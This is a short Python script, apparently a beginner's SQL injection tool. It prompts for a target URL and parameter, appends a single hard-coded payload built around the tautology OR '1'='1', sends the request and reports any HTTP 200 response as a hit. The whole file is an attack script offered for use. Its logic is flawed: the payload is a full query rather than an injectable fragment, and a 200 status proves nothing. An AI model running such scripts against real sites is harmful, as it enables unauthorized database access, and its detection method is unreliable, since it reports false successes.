import requests

# global
PAYLOADS = ["SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';"]

# UI elements
def success(message):
    print("*" *  len(message)  )
    print(f"\033[1;32m[*]{message}\033[0m")
    print("*" * len(message) )

def inject(url: str ,param: str , payload: str) -> None:
    url = f"{url}{param}{payload}"
    response = requests.get(url , timeout=1) # to avoid rate limiting

    # response.raise_for_status() since we iterating trought a list of params we dont wanna crash the program

    if response.status_code == 200:
        success(f"{url} returned a 200")

def main() -> None:
    print("=" * 40)
    print(" " * 5 +  "S Q L injection ( basic )")
    print("=" * 40)
    url = str(input("[INP] Target URL : "))
    param = str(input("[INP] Param (e.g ?id=) : "))

    for payload in PAYLOADS:
        print("*" *  len( payload ) )
        print(f"\033[1;34m[*] Trying  : [{payload}]\033[0m")
        print("*" *  len( payload ) )
        
        inject(url , param , payload)


main()
